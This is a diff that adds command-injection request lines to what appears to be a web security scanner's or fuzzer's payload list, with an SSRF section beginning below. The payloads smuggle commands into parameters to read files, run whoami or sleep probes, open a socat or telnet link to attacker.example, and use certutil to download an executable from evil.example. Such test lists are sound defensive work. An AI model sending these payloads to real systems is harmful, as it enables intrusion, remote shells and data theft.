@@ -256,6 +256,31 @@ POST /ping body="host=\$(id)"
 POST /convert body="file=test.pdf;rm -rf /tmp/x"
 POST /convert body="file=test.pdf;chmod 777 /tmp/x"
 POST /convert body="file=test.pdf;cat /etc/passwd"
+GET /?host=127.0.0.1%3Bsleep%205
+GET /?host=127.0.0.1%3Bping%20-c%201%20attacker.example
+GET /?host=127.0.0.1%3Bnslookup%20attacker.example
+GET /?host=127.0.0.1%3Bdig%20attacker.example
+GET /?host=127.0.0.1%3Btelnet%20attacker.example%204444
+GET /?cmd=%3Bsocat%20TCP:attacker.example:4444
+GET /?cmd=%3Bbase64%20/tmp/x
+GET /?cmd=%3Btouch%20/tmp/pwn
+GET /?cmd=%3Becho%20pwned
+GET /?cmd=%3Bpython3%20-c%20%27import%20os%27
+GET /?cmd=%3Bperl5%20-e%20%27print%201%27
+GET /?cmd=%3Bphp8%20-r%20%27system%28%22id%22%29%3B%27
+GET /?x=$(sleep%205)
+GET /?x=%60sleep%205%60
+GET /?x=$(ping%20-c%201%20attacker.example)
+GET /?x=$(base64%20/tmp/x)
+GET /?cmd=127.0.0.1%20%26%20whoami
+GET /?cmd=%26%20dir
+GET /?cmd=%26%20type%20C:%5Cx.txt
+GET /?cmd=%3Bcertutil%20-urlcache%20-f%20http://evil.example/x.exe
+GET /?cmd=%3Bwmic%20process%20call%20create%20notepad
+GET /?cmd=%3B%7Bcat,/tmp/x%7D
+GET /?cmd=/bin/cat%20/tmp/x
+GET /?host=127.0.0.1%0Acat%20/tmp/x
+GET /?cmd=%0A%2Fbin%2Fcat%20/tmp/x
 
 # --- SSRF ---
 GET /?url=http://169.254.169.254/latest/meta-data/
